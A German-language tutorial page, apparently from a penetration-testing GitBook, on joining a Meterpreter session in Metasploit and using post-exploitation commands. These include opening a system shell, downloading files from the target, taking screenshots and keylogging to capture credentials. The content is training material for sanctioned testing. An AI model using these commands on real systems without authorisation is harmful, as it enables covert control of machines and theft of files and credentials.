# Metapreter console

### In eine Meterpreter-Session einsteigen

Nachdem dein Payload auf dem Zielsystem ausgeführt wurde und eine Verbindung zu deinem Multi/Handler hergestellt hat, erscheint eine neue Meterpreter-Session in deiner Metasploit-Konsole. Um diese Session zu übernehmen, gehst du wie folgt vor:

1.  **Aktive Sessions auflisten:**\
    Gib in der msfconsole den Befehl ein:

    ```bash
    sessions
    ```

    Dadurch erhältst du eine Übersicht aller aktiven Sessions inklusive deren IDs.
2.  **Session übernehmen (joinen):**\
    Um in eine bestimmte Session einzusteigen, verwende:

    ```bash
    sessions -i <ID>
    ```

    Ersetze `<ID>` durch die entsprechende Sitzungsnummer. Beispiel:

    ```bash
    sessions -i 1
    ```

    Damit wechselst du in die interaktive Meterpreter-Konsole der ausgewählten Session.

***

### Wichtige Meterpreter-Befehle

Sobald du in der Session bist, stehen dir zahlreiche Befehle zur Verfügung, um das Zielsystem zu analysieren und zu steuern. Hier sind einige der wichtigsten:

*   **help oder ?**\
    Zeigt alle verfügbaren Meterpreter-Befehle an.

    ```bash
    meterpreter > help
    ```
*   **sysinfo**\
    Zeigt detaillierte Systeminformationen des Zielsystems (Betriebssystem, Architektur, etc.).

    ```bash
    meterpreter > sysinfo
    ```
*   **getuid**\
    Zeigt den aktuellen Benutzer an, unter dem die Session läuft.

    ```bash
    meterpreter > getuid
    ```
*   **shell**\
    Wechselt von der Meterpreter-Konsole in eine native System-Shell (z.B. `cmd.exe` unter Windows oder `/bin/sh` unter Linux).

    ```bash
    meterpreter > shell
    ```

    _Hinweis:_ Um wieder zur Meterpreter-Konsole zurückzukehren, beende die Shell (bei Windows typischerweise mit `exit`).
* **pwd, ls, cd**\
  Navigiere im Dateisystem des Zielsystems:
  * `pwd` zeigt das aktuelle Verzeichnis.
  * `ls` listet den Inhalt des aktuellen Verzeichnisses auf.
  * `cd` wechselt in ein anderes Verzeichnis.
* **download und upload**\
  Übertrage Dateien zwischen deinem System und dem Zielsystem:
  * `download <Ziel-Dateipfad>` lädt eine Datei vom Zielsystem herunter.
  * `upload <lokaler Dateipfad> <Zielpfad>` überträgt eine Datei auf das Zielsystem.
*   **screenshot**\
    Macht einen Screenshot des Zielsystems (nur bei grafischen Benutzeroberflächen).

    ```bash
    meterpreter > screenshot
    ```
*   **keyscan\_start / keyscan\_stop**\
    Startet bzw. stoppt die Aufzeichnung von Tastatureingaben, was beim Auswerten von Anmeldeinformationen helfen kann.

    ```bash
    meterpreter > keyscan_start
    meterpreter > keyscan_stop
    ```

***

### Zusammenfassung

1. **Session-Management:**
   * **Auflisten:** `sessions`
   * **Joinen:** `sessions -i <ID>`
2. **Grundlegende Befehle innerhalb der Meterpreter-Session:**
   * **Systeminfos abrufen:** `sysinfo`
   * **Benutzer anzeigen:** `getuid`
   * **In System-Shell wechseln:** `shell`
   * **Dateisystem navigieren:** `pwd`, `ls`, `cd`
   * **Dateiübertragung:** `download` / `upload`
   * **Weitere nützliche Funktionen:** `screenshot`, `keyscan_start`, `keyscan_stop`

Diese Befehle bilden die Basis für die Arbeit in einer Meterpreter-Session. Je nach Zielsystem und spezifischen Anforderungen kannst du weitere, spezialisierte Befehle nutzen. In deinem GitBook kannst du jeden dieser Punkte noch detaillierter erklären und mit Beispielen oder Screenshots untermauern, um deinen Lesern einen praxisnahen Leitfaden zu bieten.

***
